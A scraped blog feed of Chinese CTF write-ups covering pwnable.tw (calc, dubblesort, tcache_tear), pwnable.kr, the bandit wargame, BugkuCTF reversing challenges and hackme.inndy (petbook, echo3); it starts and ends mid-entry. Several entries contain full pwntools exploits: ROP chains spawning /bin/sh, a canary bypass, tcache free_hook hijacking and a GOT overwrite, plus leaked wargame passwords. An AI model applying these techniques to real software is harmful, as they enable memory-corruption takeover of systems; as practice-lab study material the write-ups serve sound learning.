&lt;= 99; ++i ) &#123; result = pool; pool-&gt;data[i] = 0; &#125; return result;&#125; parse_expr函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182signed int __cdecl parse_expr(int buf, pool *pool)&#123; int n; // ST2C_4 int v4; // eax int src; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v7; // [esp+28h] [ebp-80h] char *dest; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); src = buf; v7 = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) &#123; if ( (*(i + buf) - '0') &gt; 9 ) //当buf[i]为 运算符时，将前面的数字存到pool中 &#123; n = i + buf - src; dest = malloc(n + 1); memcpy(dest, src, n); dest[n] = 0; if ( !strcmp(dest, "0") ) //数字的第一位不可以为0 &#123; puts("prevent division by zero"); fflush(stdout); return 0; &#125; v9 = atoi(dest); if ( v9 &gt; 0 ) &#123; v4 = pool-&gt;idx++; pool-&gt;data[v4] = v9; //将数字存储到pool &#125; if ( *(i + buf) &amp;&amp; (*(i + 1 + buf) - '0') &gt; 9 )//两个运算符不能相邻 &#123; puts("expression error!"); fflush(stdout); return 0; &#125; src = i + 1 + buf; if ( s[v7] ) //s数组是用来存储运算符的 &#123; switch ( *(i + buf) ) &#123; case '%': case '*': case '/': if ( s[v7] != '+' &amp;&amp; s[v7] != '-' ) &#123; eval(pool, s[v7]); s[v7] = *(i + buf); &#125; else &#123; s[++v7] = *(i + buf); &#125; break; case '+': case '-': eval(pool, s[v7]); s[v7] = *(i + buf); break; default: eval(pool, s[v7--]); break; &#125; &#125; else &#123; s[v7] = *(i + buf); &#125; if ( !*(i + buf) ) break; &#125; &#125; while ( v7 &gt;= 0 ) eval(pool, s[v7--]); return 1;&#125; 漏洞在eval函数中，这里存在一个逻辑漏洞，可以通过构造形如 +300+1的payload 修改 pool.idx, 进而实现任意地址写 123456789101112131415161718192021222324252627pool *__cdecl eval(pool *pool, char a2)&#123; pool *result; // eax if ( a2 == '+' ) &#123; pool-&gt;data[pool-&gt;idx - 2] += pool-&gt;data[pool-&gt;idx - 1]; &#125; else if ( a2 &gt; '+' ) &#123; if ( a2 == '-' ) &#123; pool-&gt;data[pool-&gt;idx - 2] -= pool-&gt;data[pool-&gt;idx - 1]; &#125; else if ( a2 == '/' ) &#123; pool-&gt;data[pool-&gt;idx - 2] /= pool-&gt;data[pool-&gt;idx - 1]; &#125; &#125; else if ( a2 == '*' ) &#123; pool-&gt;data[pool-&gt;idx - 2] *= pool-&gt;data[pool-&gt;idx - 1]; &#125; result = pool; --pool-&gt;idx; return result;&#125; 漏洞找到后就很好做了，虽然它开了canary，但是并没有用，因为有任意地址写。这个程序是静态编译的，所以可以利用ROPgadget 生成ropchain，最后利用这个漏洞将ropchain写入栈中去执行。 ROPgadget –binary calc –ropchain 先计算返回地址到pool的偏移 对应的数组下标 从ida中观察calc函数的栈，可以发现pool在栈中的偏移为0x5a0， 返回地址和pool的距离为0x5a0+4 所以对应的数组下标为0x5a4/4 = 361 调试一下，在calc函数处下个断点 当程序断在calc函数时，对应的esp和ebp以及返回地址的在栈中的地址如下 1234$esp = 0xffffc990$ebp = 0xffffcf48$ret_add = 0xffffcf4c ==&gt; 0x8049499 (main+71) ◂— mov dword ptr [esp], 0x80bf842pool = 0xffffc9a8 泄露361偏移处的内容 可以发现把返回地址的内容泄露出来了，最后将rop链写入栈中就ok了 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env pythonfrom pwn import *local = 0if local: sh = process('./calc') elf = ELF('./calc') libc = elf.libcelse: sh = remote("chall.pwnable.tw",10100) elf = ELF('./calc')context.arch = elf.archcontext.log_level='debug'def sd(content): sh.send(content)def sl(content): sh.sendline(content)def rc(): return sh.recv()def ru(content): return sh.recvuntil(content) def calc(x,y): sl("+" + str(x)) data = sh.recvline() data = int(data,10) if data &gt; y : temp = data - y payload = "+" + str(x) + "-" + str(temp) sl(payload) rc() else: temp = y - data payload = "+" + str(x) + "+" + str(temp) sl(payload) rc()p = []p.append(0x080701aa) # pop edx ; retp.append(0x080ec060) # @ .datap.append(0x0805c34b) # pop eax ; retp.append(u32('/bin'))p.append(0x0809b30d) # mov dword ptr [edx], eax ; retp.append(0x080701aa) # pop edx ; retp.append(0x080ec064) # @ .data + 4p.append(0x0805c34b) # pop eax ; retp.append(u32('//sh'))p.append(0x0809b30d) # mov dword ptr [edx], eax ; retp.append(0x080701aa) # pop edx ; retp.append(0x080ec068) # @ .data + 8p.append(0x080550d0) # xor eax, eax ; retp.append(0x0809b30d) # mov dword ptr [edx], eax ; retp.append(0x080481d1) # pop ebx ; retp.append(0x080ec060) # @ .datap.append(0x080701d1) # pop ecx ; pop ebx ; retp.append(0x080ec068) # @ .data + 8p.append(0x080ec060) # padding without overwrite ebxp.append(0x080701aa) # pop edx ; retp.append(0x080ec068) # @ .data + 8p.append(0x080550d0) # xor eax, eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x0807cb7f) # inc eax ; retp.append(0x08049a21) # int 0x80rc()for i in range(len(p)): calc(361+i,p[i])sh.sendline("")sh.interactive() dubble sort防护机制： 12345678☁ doublesort checksec dubblesort [*] &apos;/home/zs0zrc/pwn/pwnable.tw/doublesort/dubblesort&apos; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 简单的运行了一下，程序先要你输入一个用户名，然后输入想要排序的数字个数和要排序的数字，最后将输入的数字排好序打印出来。 1234567891011☁ doublesort ./dubblesort What your name :dasHello das���/,How many numbers do you what to sort :3Enter the 0 number : 2Enter the 1 number : 1Enter the 2 number : 4Processing......Result :1 2 4 % 程序的逻辑不复杂，简单的逆一下。程序实现了一个简单的冒泡排序。 main函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int __cdecl main(int argc, const char **argv, const char **envp)&#123; int len; // eax int *temp; // edi unsigned int i; // esi unsigned int j; // esi int v7; // ST08_4 int result; // eax unsigned int n; // [esp+18h] [ebp-74h] int array; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int v12; // [esp+7Ch] [ebp-10h] v12 = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, "What your name :"); read(0, &amp;buf, 0x40u); // 没有0截断，可以用来泄露栈上的信息 __printf_chk(1, "Hello %s,How many numbers do you what to sort :"); __isoc99_scanf("%u", &amp;n); len = n; // 没有限制输入的个数，可以造成栈溢出 if ( n ) &#123; temp = &amp;array; i = 0; do &#123; __printf_chk(1, "Enter the %d number : "); fflush(stdout); __isoc99_scanf("%u", temp); ++i; len = n; ++temp; &#125; while ( n &gt; i ); &#125; sort((unsigned int *)&amp;array, len); puts("Result :"); if ( n ) &#123; j = 0; do &#123; v7 = *(&amp;array + j); __printf_chk(1, "%u "); ++j; &#125; while ( n &gt; j ); &#125; result = 0; if ( __readgsdword(0x14u) != v12 ) sub_BA0(); return result;&#125; 可以很容易的发现其中的两个漏洞。一个是在读取name时没有进行0截断，导致可以泄露出栈上的一些信息。另一个就是它对输入数字的个数没有限制，导致了栈溢出。sort函数对输入的数字进行冒泡排序。 首先是信息泄露，通过观察栈中的情况，发现可以泄露出libc的地址 123456789pwndbg&gt; telescope 0xffffcedc00:0000│ 0xffffcedc ◂— 0x61616161 (&apos;aaaa&apos;)01:0004│ 0xffffcee0 —▸ 0xffffd10a ◂— 0x11000002:0008│ 0xffffcee4 ◂— 0x2f /* &apos;/&apos; */03:000c│ 0xffffcee8 ◂— 0x5e /* &apos;^&apos; */04:0010│ 0xffffceec ◂— 0x1605:0014│ 0xffffcef0 ◂— 0x800006:0018│ 0xffffcef4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db007:001c│ 0xffffcef8 —▸ 0xf7fb3244 —▸ 0xf7e1b020 (_IO_check_libio) ◂— call 0xf7f22b59 libc地址泄露出来后可以计算出system函数地址以及binsh字符串地址，加上有个栈溢出，所以这题应该是用rop来做了。但是它保护机制全开，要想办法绕过canary。这里涉及到一个知识点，就是scanf读取“+” “-” 这两个符号时，不会改变栈里的内容，而且也不会影响之后的输入。所以只要在往canary写入时，输入”+”就不会改变canary。就可以开心的进行rop了。 计算canary 相对于数组的下标 1234array_add = 0xffa6ae7ccanary_add = 0xffa6aedcoffset = canary_add - array_add = 0x60index = offset/4 = 24 所以canary相对于数组的下标为24，也就是第25个数字 计算返回地址相对于数组的下标 1234array_add = 0xff8ee36cret_add = 0xff8ee3ecoffset = 0x80index = offset/4 = 32 所以返回地址相对于数组的下标为32，也就是第33个数字 还有一点要注意的是sort函数对数组排序的影响，canary前面的数字都要比canary小，canary后面的数字都要比canary大，不然的话sort函数就会是canary的位置发生变换，就会触发_stack_chk_fail函数。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./dubblesort') elf = ELF('./dubblesort') libc = elf.libcelse: p = remote("chall.pwnable.tw",10101) elf = ELF('./dubblesort') libc = ELF('./libc_32.so.6') context.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))debug(0x931,True) #sort start#debug(0x9BB,True) #sort end#debug(0x9c3,True) #mainrc()sd('a'*0x18 + '\x01')ru('a'*0x18)leak = u32(p.recv()[:4])#libc_base = leak - 0x1b0001 #remotelibc_base = leak - 0x1b2001 #locallibc.address = libc_basesystem = libc.symbols['system']binsh = libc.search("/bin/sh").next()log.info("libc_base ==&gt; &#123;&#125;".format(hex(libc_base)))sl("35")for i in range(24): rc() sl(str(0xdeadbeef))rc()sl("+")for i in range(7): rc() sl(str(system)) pause()rc()sl(str(system))rc()sl(str(0xdeadbeef))rc()sl(str(binsh))p.interactive() tcahce_tear过程不小心删掉了….就不再写了，看exp。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import*context.log_level="debug"#p = process('./tcache_tear')p = remote("chall.pwnable.tw","10207")elf = ELF('./tcache_tear')libc = elf.libcdef new(size,content): p.sendlineafter("Your choice :","1") p.sendlineafter("Size:",str(size)) p.sendafter("Data:",content) def free(): p.sendlineafter("Your choice :","2") def show(): p.sendlineafter("Your choice :","3")p.sendafter("Name:",'a'*0x20)new(0x80,'aaaa\n')free()free()new(0x80,p64(0x602020)*2 + "\n")new(0x80,"\n")log.info("******leak info********")fake_stdout = p64(0xfbad1800) + p64(0)*3 + "\x00"new(0x80,"\x60")new(0x80,fake_stdout)leak = p.recv(0x60)leak = leak[0x20:]leak_add = u64(leak[:6].ljust(8,'\x00'))libc_base = leak_add - 0x3eb780libc.address = libc_basesuccess(hex(libc_base))one_gadget = libc_base + 0x4f322free_hook = libc.symbols['__free_hook']new(0x20,'aaaa\n')free()free()new(0x20,p64(free_hook)*2 + "\n")new(0x20,"\n")new(0x20,p64(one_gadget))free()p.interactive("zs0zrc&gt;&gt;")#FLAG&#123;tc4ch3_1s_34sy_f0r_y0u&#125;]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr writeup]]></title>
    <url>%2F2018%2F10%2F06%2F2018-10-6-pwnable.kr-writeup%2F</url>
    <content type="text"><![CDATA[感觉pwnable.tw有点点难，还是先做pwnable.kr好了，writeup都会写在这篇文章里 bof这题给了二进制文件和源码 源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 一个简单的栈溢出，只要覆盖变量key为0xcafebabe 就会执行system函数 exp: 12345678from pwn import *p = remote('pwnable.kr',9000)offset = 0x2c+8payload = 'a'*offset +"\xbe\xba\xfe\xca"p.sendline(payload)p.interactive() flag这道题给了一个ELF文件，题目提示说这是一个打包过的礼物，可以猜测它加过壳。 用strings 打印下文件的可见字符串 1234567891011 $ strings flagUPX!@/x8gX lw_H/\_@ Kl$H9\$(t.....PROT_EXEC|PROT_WRITE failed.$Info: This file is packed with the UPX executable packer http://upx.sf.net $$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ 可以看到程序加了upx壳，并且upx版本是3.08。先脱个壳 ，linux下用 upx -d 命令，然后拖到ida中反编译下 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *dest; // ST08_8 puts("I will malloc() and strcpy the flag there. take it.", argv, envp); dest = (char *)malloc(100LL); strcpy(dest, flag); return 0;&#125; 可以看到程序逻辑很简单，它将flag复制到dest变量，所以可以在data段中找到flag]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargames--bandit 通关教程]]></title>
    <url>%2F2018%2F10%2F05%2F2018-10-5-Wargames--bandit-%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[这是一个让人熟悉linux操作的一个wargame，挺有意思的 网站 bandit0直接ssh连上去，cat readme 拿到下一关的密码 密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1 bandit1这一关它将密码藏在 - 文件中，以’-‘作为文件名，代表标准输入流或者标准输出流，要显示 ‘-‘文件的内容 需要用 cat ./- 来打印出来 密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit2这关它将密码存在 spaces in this filename这个文件中，但是直接cat 的话不行，要在文件名左右加上”， 通过 cat “spaces in this filename”打印密码 密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit3进到inhere的目录下，ls发现没有东西。通过 ls -al 将隐藏的文件也显示出来，发现有个.hidden文件。在linux下文件名以.开头的都默认会隐藏起来。 通过 cat .hidden打印密码 密码：pIwrPrtPN36QITSp3EQaw936yaFoFgAB bandit4发现inhere中有好多个文件，文件名都以’-‘开头，所以不能直接 用cat命令+文件名，文件名前加./ 用file 命令查看目录下文件的类型，发现有个ASCII text和别的都不一样，密码就在这个文件里面 1234567891011121314151617bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: PGP\011Secret Key -./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: data 密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit5题目给的提示： 12345The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:human-readable1033 bytes in sizenot executable 进入inhere文件夹，可以发现有很多目录，结合题目给的提示，用find命令查找文件 123456find -type f -size 1033c-type设置查找文件的属性 f是普通文件-size指定查找的大小bandit5@bandit:~/inhere$ find -type f -size 1033c./maybehere07/.file2 密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit6题目提示 12345The password for the next level is stored somewhere on the server and has all of the following properties:owned by user bandit7owned by group bandit633 bytes in size 文件在服务器的某个位置，文件的用户是 bandit7 群组是 bandit6,大小为33c 用命令 1234find / -user bandit7 -group bandit6 -size 33c会出来一堆东西，但是又权限的只有/var/lib/dpkg/info/bandit7.password用cat将它内容打印出来 密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs bandit7这关密码存在 data.txt中，并且密码在millionth这个单词后面，用grep命令 12grep millionth data.txtmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV 密码：cvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit8密码存储在data.txt中，并且只出现一次 用sort命令给data.txt的内容排序，同时用uniq命令忽略文件的重复行 123456sort data.txt | uniq -u -u 参数是只显示出现一次的行列bandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhRbandit8@bandit:~$ 密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR bandit9密码存储在data.txt中，并且以几个 “===”开头 用strings 命令打印data.txt的可见字符，用grep命令筛选出包含 “===”的字符串 12345bandit9@bandit:~$ strings data.txt | grep "=="&lt;========== the?========== password*========== is:========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk 密码 ： truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk bandit10密码存储在data.txt中，并且被base64加密过，这里用到的命令是base64 12345base64用法：格式：base64 file从指定的文件file中读取数据，编码为base64字符串输出。格式：base64 -d file从标准输入中读取已经进行base64编码的内容，解码输出。 12bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR 密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit11题目提示所有大小写字母位置都旋转了13个位置，这里用到了tr命令 12345678910111213141516171819202122232425tr 参数 前面的是原字符集，后面的是要替换的字符集-c或——complerment：取代所有不属于第一字符集的字符；-d或——delete：删除所有属于第一字符集的字符；-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。tr能使用的字符类：[:alnum:]：字母和数字[:alpha:]：字母[:cntrl:]：控制（非打印）字符[:digit:]：数字[:graph:]：图形字符[:lower:]：小写字母[:print:]：可打印字符[:punct:]：标点符号[:space:]：空白字符[:upper:]：大写字母[:xdigit:]：十六进制字符用法：转换大小写：echo "HELLO WORLD" | tr 'A-Z' 'a-z'or echo "HELLO WORLD" | tr '[:upper:]' '[:lower:]' 这一题输入的命令 12bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu 密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit12未完待续]]></content>
      <categories>
        <category>wargames</category>
      </categories>
      <tags>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF RE writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-4-BugkuCTF-RE-writeup%2F</url>
    <content type="text"><![CDATA[最近想搞下逆向，就去刷了下BugkuCTF的逆向题 Easy_vb这是一道VB的逆向，下了个VB Decomoplier,反编译一下就可以看到flag了 easy_re拿ida打开文件，在比较语句那下个断点，动态调试，在内存中就可以看到flag了 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax __int128 v5; // [esp+0h] [ebp-44h] __int64 v6; // [esp+10h] [ebp-34h] int v7; // [esp+18h] [ebp-2Ch] __int16 v8; // [esp+1Ch] [ebp-28h] char v9; // [esp+20h] [ebp-24h] _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((const __m128i *)&amp;xmmword_11F3E34)); v7 = 0; v6 = qword_11F3E44; v8 = 0; printf("欢迎来到DUTCTF呦\n"); printf("这是一道很可爱很简单的逆向题呦\n"); printf("输入flag吧:"); scanf("%s", &amp;v9); v3 = strcmp((const char *)&amp;v5, &amp;v9);//在这下个断点 if ( v3 ) v3 = -(v3 &lt; 0) | 1; if ( v3 ) printf(aFlag_0); else printf((const char *)&amp;unk_11F3E90); system("pause"); return 0;&#125; 游戏过关这个就比较神奇，我拿到程序一顿瞎输，flag就出来了……. 只要依次输入 0-8,就可以看到flag了 Timer逆向入门拖到010editor中，发现是个base64，将它转换成图片会获得一个二维码，扫码得flag]]></content>
      <categories>
        <category>BugkuCTF RE writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[petbook writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-3-petbook-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 1234567[*] '/home/zs0zrc/pwn/Scoreboard/petbook/petbook' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开启了NX和Canary还有 FORTIFY FORTIFY是用来检测缓存区溢出的一个机制，感觉好像没什么用，详情参考这篇博客 逆出来的user结构体 123456789struct user&#123; int uid; char name[0x100]; char pwd[0x100]; int flag; char *petname; char *post;&#125;users; pet结构体 123456struct pet&#123; int uid; char *name; char *type;&#125;pet; //大致长这样 程序的功能有： register 创建用户 login 登陆 post edit post change password adopt pet rename pet abandon pet 程序的漏洞在于 register创建用户时，malloc的堆块未初始化，导致可以控制新创建的users的petname和post指针，可以通过post泄露信息，通过pet来实现任意地址写 1234567891011121314int __fastcall user_create(char *src, char *password)&#123; users *user; // rbp if ( user_find_by_name(src) ) return __printf_chk(1LL, "User %s existed!\n", src); user = malloc(0x218uLL); //漏洞所在，没有初始化 user-&gt;uid = uid(); strncpy(user-&gt;name, src, 0x100uLL); strncpy(user-&gt;password, password, 0x100uLL); user-&gt;flag = 0; link_insert(&amp;userdb, user); return puts("User created");&#125; 泄露信息：通过控制未初始化的user的pet指针，泄露信息 123456v4 = user-&gt;petname;if ( v4 )&#123; __printf_chk(1LL, &quot;= Pet Name: %s\n&quot;, *(v4 + 1)); __printf_chk(1LL, &quot;= Pet Type: %s\n&quot;, *(user-&gt;petname + 2));&#125; 任意地址写： 1234567891011121314151617181920212223int pet_rename()&#123; __int64 v0; // rbx _DWORD *v1; // rdx v0 = current_user; if ( (*current_user ^ magic) &amp; 0xFFFF0000 ) &#123; puts("corrupted object detected"); exit(1); &#125; v1 = *(current_user + 0x208); if ( !v1 ) return puts("You don't have a pet"); if ( (*v1 ^ magic) &amp; 0xFFFF0000 ) //这里要绕过这个检查，所以要将magic泄露出来 &#123; puts("corrupted object detected"); exit(1); &#125; puts("Name your pet &gt;&gt;"); read_data(*(*(v0 + 0x208) + 8LL), 16LL); return stripnl(*(*(v0 + 0x208) + 8LL));&#125; 利用思路： 1234先create一个用户，这个用户new一个大小大于0x218的post,然后编辑这个post，增加它的大小，使它原本的chunk被realloc函数free掉，放入unsortedbins中。这时再create一个用户，那么这个用户malloc申请的chunk就会从unsortedbin中的chunk切割下来，就可以控制这个用户的petname和post指针 具体步骤： 先创建一个用户’aaaa’,new一个post1,大小为0x230，将petname指针设置为userdb地址 - 0x10,然后编辑post1，使post1原本的chunk被relloca函数free掉 新建一个用户’bbbb’，泄露出堆地址 新建两个post，post2大小为0x100,post3大小为0x230，在post2中写入要泄露的地址，在post3中设置petname指针为post2的地址，post2的地址通过泄露的堆地址计算出来。通过控制 post2的内容，就可以泄露出想要的信息。 新建用户’cccc’,泄露出 magic和libc地址 new一个post4，将petname指针指向post2地址，然后编辑post4将原本的chunk free掉，新建一个用户’dddd’，用户’dddd’的petname指针就指向post2 伪造fake_magic，登陆用户’bbbb’，编辑post2内容为 p64(fake_magic)+p64(free_got) 登陆用户 ‘dddd’, 通过rename功能修改free_got为system函数 新建一个用户’ffff’, adopt一个pet ，name为’/bin/sh\x00’，再abandom掉就可调用system函数了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#!/usr/bin/env pythonfrom pwn import *local = 1context.log_level = 'debug'if local: p = process('./petbook') elf = ELF('./petbook') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7710' p = remote(host,port) elf = ELF('./petbook') libc = ELF('./libc-2.23.so.x86_64')def register(name,password): p.sendlineafter(" &gt;&gt;\n",'1') p.sendlineafter("Username &gt;&gt;\n",name) p.sendlineafter("Password &gt;&gt;\n",password)def login(name,password): p.sendlineafter(" &gt;&gt;\n",'2') p.sendlineafter("Username &gt;&gt;\n",name) p.sendlineafter("Password &gt;&gt;\n",password)def logout(): p.sendlineafter(" &gt;&gt;\n",'0')def post(title,size,content): p.sendlineafter(" &gt;&gt;\n",'1') p.sendlineafter("Title &gt;&gt;\n",title) p.sendlineafter("Content Length &gt;&gt;\n",str(size)) p.sendlineafter("Content &gt;&gt;\n",content)def edit_post(id,title,size,content): p.sendlineafter(" &gt;&gt;\n",'3') p.sendlineafter("Post id &gt;&gt;\n",str(id)) p.sendlineafter("New title &gt;&gt;\n",title) p.sendlineafter("New content size &gt;&gt;\n",str(size)) p.sendlineafter("Content &gt;&gt;\n",content) def adopt(name): p.sendlineafter(" &gt;&gt;\n",'5') p.sendlineafter("Name your pet &gt;&gt;\n",name)def rename(name): p.sendlineafter(" &gt;&gt;\n",'6') p.sendlineafter("Name your pet &gt;&gt;\n",name)def abandom(): p.sendlineafter(" &gt;&gt;\n",'7')payload1= 'a'*0x208 + p64(0x603158-0x10)*4register('aaaa','aaaa')login('aaaa','aaaa')post('1111',0x230,payload1) #post1edit_post(2,'1111',0x240,'bbbb')logout()register('bbbb','bbbb')login('bbbb','bbbb')log.info("leak heap address")p.recvuntil("Pet Type: ")leak_heap = u64(p.recvline().strip('\n').ljust(8,'\x00'))heap_base = leak_heap - 0x230log.info("leak heap_base address :&#123;&#125;".format(hex(heap_base)))fake_pet = heap_base + 0x940magic = 0x603164payload2 = 'a'*0x208 + p64(fake_pet)post('2222',0x100,p64(elf.got["puts"])*4) #uid = 4 post2post('3333',0x230,payload2) #uid = 5 post3edit_post(5,'2222',0x240,'2222')logout()register('cccc','cccc')login('cccc','cccc')p.recvuntil("Pet Name: ")leak_libc = u64(p.recvline().strip('\n').ljust(8,'\x00'))libc_base = leak_libc - libc.symbols['puts']libc.address = libc_basesystem = libc.symbols['system']log.info("libc address :&#123;&#125;".format(hex(libc_base)))logout()login('bbbb','bbbb')edit_post(4,'3333',0x100,p64(magic)*4)logout()login('cccc','cccc')p.recvuntil("Pet Name: ")leak_magic = u64(p.recvline().strip('\n').ljust(8,'\x00'))log.info("leak magic : &#123;&#125;".format(hex(leak_magic)))log.info("hjack free_got")fake_magic = leak_magic + 0x600000000payload3 = p64(fake_magic) + p64(elf.got['free'])payload4 = 'a'*0x208 + p64(fake_pet)post('aaaa',0x230,payload4) #uid = 7 post4edit_post(7,'1111',0x240,'aaaa')logout()register('dddd','dddd')login('bbbb','bbbb')edit_post(4,'1111',0x100,payload3)logout()login('dddd','dddd')rename(p64(system))logout()register('ffff','ffff')login('ffff','ffff')adopt('/bin/sh\x00')abandom()p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo3 writeup]]></title>
    <url>%2F2018%2F10%2F03%2F2018-10-2-echo3-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这道题是echo 和echo2的升级版，也是一个格式化字符串漏洞，不过它将printf的格式化字符串放到了bss段上去了。一般来说格式化字符串在bss段的话，就要在栈上构造跳板，通过跳板实现任意地址写。具体点就是，找到栈上指向栈的指针，向指针写入got表地址，然后再通过这实现任意地址写 main函数 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; void *v3; // esp int fd; // [esp+14h] [ebp-1Ch] int buf; // [esp+18h] [ebp-18h] unsigned int v6; // [esp+24h] [ebp-Ch] int *v7; // [esp+28h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); setbuf(stdout, 0); fd = open("/dev/urandom", 0); if ( fd &lt; 0 ) &#123; puts("urandom error"); exit(1); &#125; read(fd, &amp;buf, 8u); read(fd, &amp;magic, 4u); close(fd); v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));//它在这里做了一个抬栈的操作 hardfmt();&#125; 这里打开了/dev/urandom文件，读取了8个字节到buf中，读取了4个字节到magic中。并且它利用alloca函数，做了一个抬栈的操作，alloca函数的作用是分配内存，不过是向栈申请内存。在这里被用来抬栈，而且每次都是随机的，所以要先爆破一下，泄露出地址后才进行下一步 stack 的情况 随机抬高后的栈大部分就像这样子 1234567891011121314151617181920pwndbg&gt; stack 10000:0000│ esp 0xffffaf1c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x1001:0004│ 0xffffaf20 —▸ 0x804a080 (buff) ◂— 'aaaa\n'... ↓03:000c│ 0xffffaf28 ◂— 0x100004:0010│ 0xffffaf2c ◂— 0x005:0014│ 0xffffaf30 ◂— 'n,D*'06:0018│ 0xffffaf34 ◂— 0x0... ↓0c:0030│ 0xffffaf4c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0d:0034│ 0xffffaf50 ◂— 